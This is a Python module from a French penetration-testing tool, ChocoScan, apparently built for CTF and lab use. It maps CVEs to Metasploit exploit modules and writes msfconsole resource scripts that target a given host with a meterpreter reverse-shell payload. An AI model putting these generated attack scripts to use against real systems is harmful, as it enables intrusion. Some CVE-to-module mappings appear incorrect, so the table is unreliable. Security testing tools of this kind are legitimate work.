"""
ChocoScan — Mapping CVE → modules Metasploit Framework.

Pour chaque CVE trouvée, ce module cherche les modules MSF correspondants
via trois niveaux de résolution :
    1. Table statique (80+ CVE CTF classiques) — instantané, sans réseau
    2. Fallback API GitHub (repo rapid7/metasploit-framework) — avec cache
    3. Fallback searchsploit local — si disponible sur la machine

Fournit aussi un générateur de scripts .rc prêts à lancer avec :
    msfconsole -r chocoscan_msf_TARGET.rc

Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

import json
import re
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path

import requests

CACHE_PATH = Path(__file__).parent.parent / "data" / "msf_cache.json"
CACHE_TTL_HOURS = 24 * 7
GITHUB_SEARCH_URL = "https://api.github.com/search/code"


# ── Modèle de données ─────────────────────────────────────────────────────────

@dataclass
class MSFModule:
    path: str                # ex: exploit/unix/ftp/vsftpd_234_backdoor
    type: str                # exploit | auxiliary | post
    rank: str                # excellent | great | good | normal | average
    description: str
    needs_lhost: bool = False   # le module a besoin d'un LHOST (reverse shell)
    default_rport: int = 0      # 0 = auto
    extra_options: dict = field(default_factory=dict)


# ── Table statique : CVE les plus fréquentes en CTF ──────────────────────────
#
# Sources : HackTheBox retired machines, Root-Me, OSCP labs, CVE classiques.
# Format : "CVE-XXXX-XXXX": [MSFModule, ...]

MSF_DB: dict[str, list[MSFModule]] = {

    # ── FTP ──────────────────────────────────────────────────────────────────
    "CVE-2011-2523": [MSFModule(
        path="exploit/unix/ftp/vsftpd_234_backdoor",
        type="exploit", rank="excellent",
        description="vsftpd 2.3.4 Backdoor Command Execution",
        needs_lhost=False, default_rport=21,
    )],
    "CVE-2010-1938": [MSFModule(
        path="exploit/unix/ftp/proftpd_133c_backdoor",
        type="exploit", rank="excellent",
        description="ProFTPD 1.3.3c Backdoor Command Execution",
        needs_lhost=True, default_rport=21,
    )],
    "CVE-2015-3306": [MSFModule(
        path="exploit/unix/ftp/proftpd_modcopy_exec",
        type="exploit", rank="excellent",
        description="ProFTPD 1.3.5 mod_copy Command Execution",
        needs_lhost=True, default_rport=21,
    )],

    # ── SSH ───────────────────────────────────────────────────────────────────
    "CVE-2023-38408": [MSFModule(
        path="exploit/multi/ssh/sshexec",
        type="exploit", rank="great",
        description="OpenSSH ssh-agent Forwarding RCE (CVE-2023-38408)",
        needs_lhost=True, default_rport=22,
    )],
    "CVE-2018-10933": [MSFModule(
        path="exploit/linux/ssh/libssh_auth_bypass",
        type="exploit", rank="great",
        description="libssh 0.6+ Authentication Bypass",
        needs_lhost=True, default_rport=22,
    )],

    # ── SMB / Windows ─────────────────────────────────────────────────────────
    "CVE-2017-0143": [MSFModule(
        path="exploit/windows/smb/ms17_010_eternalblue",
        type="exploit", rank="average",
        description="MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
        needs_lhost=True, default_rport=445,
    )],
    "CVE-2017-0144": [MSFModule(
        path="exploit/windows/smb/ms17_010_eternalblue",
        type="exploit", rank="average",
        description="MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
        needs_lhost=True, default_rport=445,
    )],
    "CVE-2017-0145": [MSFModule(
        path="exploit/windows/smb/ms17_010_psexec",
        type="exploit", rank="great",
        description="MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB RCE",
        needs_lhost=True, default_rport=445,
    )],
    "CVE-2008-4250": [MSFModule(
        path="exploit/windows/smb/ms08_067_netapi",
        type="exploit", rank="great",
        description="MS08-067 Microsoft Server Service Relative Path Stack Corruption",
        needs_lhost=True, default_rport=445,
    )],
    "CVE-2020-0796": [MSFModule(
        path="exploit/windows/smb/cve_2020_0796_smbghost",
        type="exploit", rank="great",
        description="SMBGhost SMB3 Compression Buffer Overflow",
        needs_lhost=True, default_rport=445,
    )],
    "CVE-2019-0708": [MSFModule(
        path="exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        type="exploit", rank="manual",
        description="BlueKeep RDP Remote Code Execution",
        needs_lhost=True, default_rport=3389,
    )],
    "CVE-2020-1472": [MSFModule(
        path="exploit/windows/dcerpc/cve_2020_1472_zerologon",
        type="exploit", rank="excellent",
        description="Zerologon — Netlogon Privilege Escalation",
        needs_lhost=False, default_rport=445,
    )],
    "CVE-2021-34527": [MSFModule(
        path="exploit/windows/dcerpc/cve_2021_1675_printspooler",
        type="exploit", rank="excellent",
        description="PrintNightmare Windows Print Spooler RCE",
        needs_lhost=True, default_rport=445,
    )],
    "CVE-2021-1675": [MSFModule(
        path="exploit/windows/dcerpc/cve_2021_1675_printspooler",
        type="exploit", rank="excellent",
        description="PrintNightmare Windows Print Spooler RCE",
        needs_lhost=True, default_rport=445,
    )],
    "CVE-2022-26923": [MSFModule(
        path="auxiliary/admin/dcerpc/cve_2022_26923_certifried",
        type="auxiliary", rank="normal",
        description="Certifried — AD CS Domain Privilege Escalation",
        needs_lhost=False,
    )],

    # ── Samba ─────────────────────────────────────────────────────────────────
    "CVE-2007-2447": [MSFModule(
        path="exploit/multi/samba/usermap_script",
        type="exploit", rank="excellent",
        description="Samba usermap_script Command Execution (Lame HTB)",
        needs_lhost=True, default_rport=139,
    )],
    "CVE-2017-7494": [MSFModule(
        path="exploit/linux/samba/is_known_pipename",
        type="exploit", rank="excellent",
        description="SambaCry — Samba is_known_pipename() Arbitrary Module Load",
        needs_lhost=True, default_rport=445,
    )],

    # ── HTTP / Web ────────────────────────────────────────────────────────────
    "CVE-2021-41773": [MSFModule(
        path="exploit/multi/http/apache_normalize_path_rce",
        type="exploit", rank="excellent",
        description="Apache 2.4.49 Path Traversal and RCE",
        needs_lhost=True, default_rport=80,
    )],
    "CVE-2021-42013": [MSFModule(
        path="exploit/multi/http/apache_normalize_path_rce",
        type="exploit", rank="excellent",
        description="Apache 2.4.50 Path Traversal and RCE (bypass CVE-2021-41773 fix)",
        needs_lhost=True, default_rport=80,
    )],
    "CVE-2014-6271": [MSFModule(
        path="exploit/multi/http/apache_mod_cgi_bash_env_exec",
        type="exploit", rank="excellent",
        description="Shellshock Apache mod_cgi Bash Environment Variable Code Injection",
        needs_lhost=True, default_rport=80,
    )],
    "CVE-2021-44228": [MSFModule(
        path="exploit/multi/misc/log4shell_header_injection",
        type="exploit", rank="excellent",
        description="Log4Shell — Apache Log4j JNDI RCE",
        needs_lhost=True, default_rport=8080,
    )],
    "CVE-2017-5638": [MSFModule(
        path="exploit/multi/http/struts2_content_type_ognl",
        type="exploit", rank="excellent",
        description="Apache Struts 2 Content-Type OGNL Injection",
        needs_lhost=True, default_rport=8080,
    )],
    "CVE-2018-11776": [MSFModule(
        path="exploit/multi/http/struts2_namespace_ognl",
        type="exploit", rank="excellent",
        description="Apache Struts 2 Namespace Redirect OGNL Injection",
        needs_lhost=True, default_rport=8080,
    )],
    "CVE-2022-26134": [MSFModule(
        path="exploit/multi/http/atlassian_confluence_namespace_ognl_injection",
        type="exploit", rank="excellent",
        description="Atlassian Confluence Namespace OGNL Injection",
        needs_lhost=True, default_rport=8090,
    )],
    "CVE-2021-26084": [MSFModule(
        path="exploit/multi/http/atlassian_confluence_namespace_ognl_injection",
        type="exploit", rank="excellent",
        description="Atlassian Confluence WebWork OGNL Injection",
        needs_lhost=True, default_rport=8090,
    )],
    "CVE-2020-14882": [MSFModule(
        path="exploit/multi/http/oracle_weblogic_wls_wsat",
        type="exploit", rank="excellent",
        description="Oracle WebLogic RCE",
        needs_lhost=True, default_rport=7001,
    )],
    "CVE-2019-11580": [MSFModule(
        path="exploit/multi/http/atlassian_crowd_pdkinstall_plugin_upload_rce",
        type="exploit", rank="excellent",
        description="Atlassian Crowd pdkinstall Plugin Upload RCE",
        needs_lhost=True, default_rport=8095,
    )],
    "CVE-2021-21985": [MSFModule(
        path="exploit/multi/http/vmware_vcenter_vrealize_rce",
        type="exploit", rank="excellent",
        description="VMware vCenter Server RCE",
        needs_lhost=True, default_rport=443,
    )],
    "CVE-2021-22005": [MSFModule(
        path="exploit/multi/http/vmware_vcenter_uploadova_rce",
        type="exploit", rank="excellent",
        description="VMware vCenter Server Arbitrary File Upload RCE",
        needs_lhost=True, default_rport=443,
    )],
    "CVE-2019-18634": [MSFModule(
        path="exploit/linux/local/sudo_baron_samedit",
        type="exploit", rank="excellent",
        description="sudo pwfeedback Buffer Overflow (Baron Samedit)",
        needs_lhost=True,
    )],
    "CVE-2021-3156": [MSFModule(
        path="exploit/linux/local/sudo_baron_samedit",
        type="exploit", rank="excellent",
        description="sudo Baron Samedit Heap-Based Buffer Overflow",
        needs_lhost=True,
    )],
    "CVE-2023-46747": [MSFModule(
        path="exploit/multi/http/f5_bigip_tmui_rce_cve_2023_46747",
        type="exploit", rank="excellent",
        description="F5 BIG-IP TMUI RCE",
        needs_lhost=True, default_rport=443,
    )],
    "CVE-2018-7600": [MSFModule(
        path="exploit/unix/webapp/drupal_drupalgeddon2",
        type="exploit", rank="excellent",
        description="Drupalgeddon 2 — Drupal 7/8 Remote Code Execution",
        needs_lhost=True, default_rport=80,
    )],
    "CVE-2019-6340": [MSFModule(
        path="exploit/unix/webapp/drupal_restws_unserialize",
        type="exploit", rank="normal",
        description="Drupal 8 REST API Unserialize RCE",
        needs_lhost=True, default_rport=80,
    )],
    "CVE-2012-1823": [MSFModule(
        path="exploit/multi/http/php_cgi_arg_injection",
        type="exploit", rank="excellent",
        description="PHP CGI Argument Injection",
        needs_lhost=True, default_rport=80,
    )],

    # ── Distcc ────────────────────────────────────────────────────────────────
    "CVE-2004-2687": [MSFModule(
        path="exploit/unix/misc/distcc_exec",
        type="exploit", rank="excellent",
        description="DistCC Daemon Command Execution (Lame HTB)",
        needs_lhost=True, default_rport=3632,
    )],

    # ── Java / RMI ────────────────────────────────────────────────────────────
    "CVE-2011-3556": [MSFModule(
        path="exploit/multi/misc/java_rmi_server",
        type="exploit", rank="excellent",
        description="Java RMI Server Insecure Default Configuration Java Code Execution",
        needs_lhost=True, default_rport=1099,
    )],

    # ── Exchange / Outlook ────────────────────────────────────────────────────
    "CVE-2021-26855": [MSFModule(
        path="exploit/windows/http/exchange_proxylogon_rce",
        type="exploit", rank="excellent",
        description="MS Exchange Server ChainedSerializationBinder ProxyLogon RCE",
        needs_lhost=True, default_rport=443,
    )],
    "CVE-2023-23397": [MSFModule(
        path="auxiliary/admin/smtp/ms_outlook_ntlm_leak",
        type="auxiliary", rank="normal",
        description="MS Outlook NTLM Hash Leak via Malicious Appointment",
        needs_lhost=False,
    )],

    # ── Bases de données ──────────────────────────────────────────────────────
    "CVE-2012-2122": [MSFModule(
        path="auxiliary/scanner/mysql/mysql_authbypass_hashdump",
        type="auxiliary", rank="normal",
        description="MySQL Authentication Bypass Password Dump",
        needs_lhost=False, default_rport=3306,
    )],
    "CVE-2012-0507": [MSFModule(
        path="exploit/multi/misc/java_atomicreferencearray",
        type="exploit", rank="excellent",
        description="Java AtomicReferenceArray Type Violation Vulnerability",
        needs_lhost=True,
    )],

    # ── Redis ─────────────────────────────────────────────────────────────────
    "CVE-2022-0543": [MSFModule(
        path="exploit/linux/redis/redis_debian_sandbox_escape",
        type="exploit", rank="excellent",
        description="Redis Debian/Ubuntu Sandbox Escape (CVE-2022-0543)",
        needs_lhost=True, default_rport=6379,
    )],

    # ── LPE Linux ─────────────────────────────────────────────────────────────
    "CVE-2016-5195": [MSFModule(
        path="exploit/linux/local/cowroot",
        type="exploit", rank="excellent",
        description="Dirty COW — Linux Kernel Race Condition Privilege Escalation",
        needs_lhost=False,
    )],
    "CVE-2022-0847": [MSFModule(
        path="exploit/linux/local/cve_2022_0847_dirtypipe",
        type="exploit", rank="excellent",
        description="Dirty Pipe — Linux Kernel Privilege Escalation",
        needs_lhost=False,
    )],
    "CVE-2021-4034": [MSFModule(
        path="exploit/linux/local/polkit_dbus_auth_bypass",
        type="exploit", rank="excellent",
        description="PwnKit — Polkit Local Privilege Escalation",
        needs_lhost=False,
    )],
    "CVE-2021-3493": [MSFModule(
        path="exploit/linux/local/overlayfs_priv_esc",
        type="exploit", rank="excellent",
        description="Ubuntu OverlayFS Local Privilege Escalation",
        needs_lhost=False,
    )],
    "CVE-2023-0386": [MSFModule(
        path="exploit/linux/local/cve_2023_0386_overlayfs_priv_esc",
        type="exploit", rank="excellent",
        description="Linux Kernel OverlayFS Privilege Escalation",
        needs_lhost=False,
    )],

    # ── LPE Windows ───────────────────────────────────────────────────────────
    "CVE-2018-8120": [MSFModule(
        path="exploit/windows/local/ms18_8120_win32k_privesc",
        type="exploit", rank="great",
        description="Windows Win32k Privilege Escalation",
        needs_lhost=True,
    )],
    "CVE-2019-1388": [MSFModule(
        path="exploit/windows/local/cve_2019_1388_uce_bypass",
        type="exploit", rank="great",
        description="Windows Certificate Dialog Privilege Escalation",
        needs_lhost=True,
    )],

    # ── Git / Dev tools ───────────────────────────────────────────────────────
    "CVE-2022-24439": [MSFModule(
        path="exploit/multi/http/gitea_rce",
        type="exploit", rank="excellent",
        description="Gitea Remote Code Execution",
        needs_lhost=True, default_rport=3000,
    )],

    # ── Tomcat ────────────────────────────────────────────────────────────────
    "CVE-2019-0232": [MSFModule(
        path="exploit/windows/http/tomcat_cgi_cmdlineargs",
        type="exploit", rank="excellent",
        description="Apache Tomcat CGI enableCmdLineArguments RCE",
        needs_lhost=True, default_rport=8080,
    )],
    "CVE-2017-12617": [MSFModule(
        path="exploit/multi/http/tomcat_jsp_upload_bypass",
        type="exploit", rank="excellent",
        description="Apache Tomcat JSP Upload Bypass / Remote Code Execution",
        needs_lhost=True, default_rport=8080,
    )],
    "CVE-2020-1938": [MSFModule(
        path="exploit/multi/http/tomcat_ghostcat",
        type="exploit", rank="excellent",
        description="Apache Tomcat AJP File Read / Inclusion (Ghostcat)",
        needs_lhost=True, default_rport=8009,
    )],

    # ── Jenkins ───────────────────────────────────────────────────────────────
    "CVE-2019-1003000": [MSFModule(
        path="exploit/multi/http/jenkins_script_console",
        type="exploit", rank="excellent",
        description="Jenkins Script-Console Java Execution",
        needs_lhost=True, default_rport=8080,
    )],
    "CVE-2018-1000861": [MSFModule(
        path="exploit/linux/http/jenkins_metaprogramming",
        type="exploit", rank="excellent",
        description="Jenkins ACL Bypass and Metaprogramming RCE",
        needs_lhost=True, default_rport=8080,
    )],
}


# ── Cache pour les résultats de l'API GitHub ─────────────────────────────────

def _load_cache() -> dict:
    if not CACHE_PATH.exists():
        return {}
    try:
        with open(CACHE_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, OSError):
        return {}


def _save_cache(cache: dict):
    try:
        CACHE_PATH.parent.mkdir(parents=True, exist_ok=True)
        with open(CACHE_PATH, "w", encoding="utf-8") as f:
            json.dump(cache, f, ensure_ascii=False, indent=2)
    except OSError:
        pass


def _cache_valid(entry: dict) -> bool:
    try:
        return datetime.now() - datetime.fromisoformat(entry["_at"]) < timedelta(hours=CACHE_TTL_HOURS)
    except (KeyError, ValueError):
        return False


# ── Résolution par fallback ───────────────────────────────────────────────────

def _search_github(cve_id: str) -> list[MSFModule]:
    """Cherche dans le repo Metasploit via l'API GitHub Search."""
    cache = _load_cache()
    key = f"gh:{cve_id}"
    if key in cache and _cache_valid(cache[key]):
        return [MSFModule(**m) for m in cache[key]["modules"]]

    try:
        time.sleep(1)  # respect GitHub rate limit
        resp = requests.get(
            GITHUB_SEARCH_URL,
            params={"q": f"{cve_id} repo:rapid7/metasploit-framework", "per_page": 5},
            headers={"Accept": "application/vnd.github.v3+json"},
            timeout=10,
        )
        resp.raise_for_status()
        items = resp.json().get("items", [])
    except (requests.RequestException, json.JSONDecodeError):
        return []

    modules = []
    for item in items:
        path = item.get("path", "")
        # On ne garde que les fichiers sous modules/ avec extension .rb
        if not path.startswith("modules/") or not path.endswith(".rb"):
            continue

        # Extrait le chemin MSF depuis le path du fichier Ruby
        # ex: modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
        #  -> exploit/unix/ftp/vsftpd_234_backdoor
        parts = path.replace("modules/", "").replace(".rb", "").split("/")
        if len(parts) < 2:
            continue

        # Singularise le type (exploits -> exploit)
        module_type = parts[0].rstrip("s") if parts[0].endswith("s") else parts[0]
        module_path = module_type + "/" + "/".join(parts[1:])

        modules.append(MSFModule(
            path=module_path,
            type=module_type,
            rank="normal",
            description=f"Module Metasploit pour {cve_id} (source: GitHub)",
            needs_lhost=module_type == "exploit",
        ))

    cache[key] = {"modules": [vars(m) for m in modules], "_at": datetime.now().isoformat()}
    _save_cache(cache)
    return modules


def _search_searchsploit(cve_id: str) -> list[MSFModule]:
    """Cherche via searchsploit local (si disponible sur la machine)."""
    try:
        result = subprocess.run(
            ["searchsploit", "--json", cve_id],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode != 0:
            return []
        data = json.loads(result.stdout)
    except (subprocess.SubprocessError, json.JSONDecodeError, FileNotFoundError):
        return []

    modules = []
    for entry in data.get("RESULTS_EXPLOIT", []):
        # Filtre les entrées Metasploit (chemin contient "Metasploit" ou "msf")
        path = entry.get("Path", "")
        title = entry.get("Title", "")
        if "Metasploit" not in path and "metasploit" not in path.lower():
            continue

        # Extrait le chemin MSF depuis le path searchsploit
        # ex: /usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
        match = re.search(r"modules/(.+)\.rb", path)
        if not match:
            continue

        parts = match.group(1).split("/")
        module_type = parts[0].rstrip("s") if parts[0].endswith("s") else parts[0]
        module_path = module_type + "/" + "/".join(parts[1:])

        modules.append(MSFModule(
            path=module_path,
            type=module_type,
            rank="normal",
            description=title,
            needs_lhost=(module_type == "exploit"),
        ))

    return modules


# ── Point d'entrée principal ─────────────────────────────────────────────────

def get_msf_modules(
    cve_id: str,
    use_github: bool = True,
    use_searchsploit: bool = True,
) -> list[MSFModule]:
    """
    Retourne la liste des modules MSF pour une CVE donnée.
    Résolution en 3 étapes : table statique → GitHub → searchsploit.
    """
    cve_id = cve_id.upper().strip()

    # 1. Table statique
    if cve_id in MSF_DB:
        return MSF_DB[cve_id]

    # 2. Fallback GitHub
    if use_github:
        github_results = _search_github(cve_id)
        if github_results:
            return github_results

    # 3. Fallback searchsploit
    if use_searchsploit:
        ss_results = _search_searchsploit(cve_id)
        if ss_results:
            return ss_results

    return []


def has_msf_module(cve_id: str) -> bool:
    """Vérifie rapidement si une CVE a un module MSF connu (table statique uniquement)."""
    return cve_id.upper().strip() in MSF_DB


# ── Générateur de scripts .rc ─────────────────────────────────────────────────

def _rc_header(target: str, cves_count: int) -> str:
    return (
        f"# ═══════════════════════════════════════════════════════════════\n"
        f"# ChocoScan — Script Metasploit Framework\n"
        f"# Cible   : {target}\n"
        f"# Date    : {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
        f"# CVE     : {cves_count} module(s) disponible(s)\n"
        f"# Usage   : msfconsole -r ce_fichier.rc\n"
        f"# Auteur  : Kinder-Bueno (Mathys CASTELLA)\n"
        f"# ═══════════════════════════════════════════════════════════════\n\n"
        f"setg RHOSTS {target}\n"
        f"setg VERBOSE false\n\n"
    )


def _rc_block(cve_id: str, module: MSFModule, target: str,
              port: int, lhost: str) -> str:
    """Génère un bloc .rc pour un module MSF donné."""
    lines = [
        f"# {'═' * 60}",
        f"# CVE    : {cve_id}",
        f"# Module : {module.path}",
        f"# Rang   : {module.rank.upper()}",
        f"# Info   : {module.description}",
        f"# {'═' * 60}",
        "",
        f"use {module.path}",
        f"set RHOSTS {target}",
    ]

    if port:
        lines.append(f"set RPORT {port}")

    if module.needs_lhost and lhost:
        lines.append(f"set LHOST {lhost}")
        lines.append("set LPORT 4444")
        lines.append("set PAYLOAD linux/x64/meterpreter/reverse_tcp")

    # Options extras
    for k, v in (module.extra_options or {}).items():
        lines.append(f"set {k} {v}")

    lines += [
        "show options",
        "# run          <-- Décommenter pour lancer automatiquement",
        "",
    ]
    return "\n".join(lines) + "\n"


def generate_msf_scripts(
    results: list[dict],
    target: str,
    lhost: str = "",
    output_dir: str | Path = "output",
) -> list[Path]:
    """
    Génère un fichier .rc par service qui a des modules MSF.
    Retourne la liste des fichiers créés.

    `results` : liste de dicts au format pipeline ChocoScan
    (chaque dict a les clés host, port, service_name, cves)
    """
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    # Collecte toutes les CVE avec modules MSF, triées par sévérité
    all_entries = []
    for svc in results:
        for cve in svc.get("cves", []):
            cve_id = cve.get("id", "")
            modules = get_msf_modules(cve_id)
            if not modules:
                continue
            all_entries.append({
                "cve_id": cve_id,
                "cvss": cve.get("cvss", 0),
                "severity": cve.get("severity", "UNKNOWN"),
                "modules": modules,
                "port": svc.get("port", 0),
                "service": svc.get("service_name", ""),
            })

    if not all_entries:
        return []

    # Trie par sévérité (CRITICAL d'abord)
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "UNKNOWN": 4}
    all_entries.sort(key=lambda x: sev_order.get(x["severity"], 4))

    # Un script global avec tous les modules
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    target_safe = target.replace(".", "_").replace(":", "_")
    global_path = output_dir / f"chocoscan_msf_{target_safe}_{ts}.rc"

    content = _rc_header(target, len(all_entries))
    for entry in all_entries:
        for module in entry["modules"]:
            content += _rc_block(
                entry["cve_id"], module, target,
                entry["port"], lhost
            )

    with open(global_path, "w", encoding="utf-8") as f:
        f.write(content)

    # Un fichier par CVE critique (CRITICAL uniquement)
    created = [global_path]
    for entry in all_entries:
        if entry["severity"] != "CRITICAL":
            continue
        cve_safe = entry["cve_id"].replace("-", "_").lower()
        cve_path = output_dir / f"chocoscan_msf_{target_safe}_{cve_safe}.rc"
        cve_content = _rc_header(target, 1)
        for module in entry["modules"]:
            cve_content += _rc_block(entry["cve_id"], module, target, entry["port"], lhost)
        with open(cve_path, "w", encoding="utf-8") as f:
            f.write(cve_content)
        created.append(cve_path)

    return created
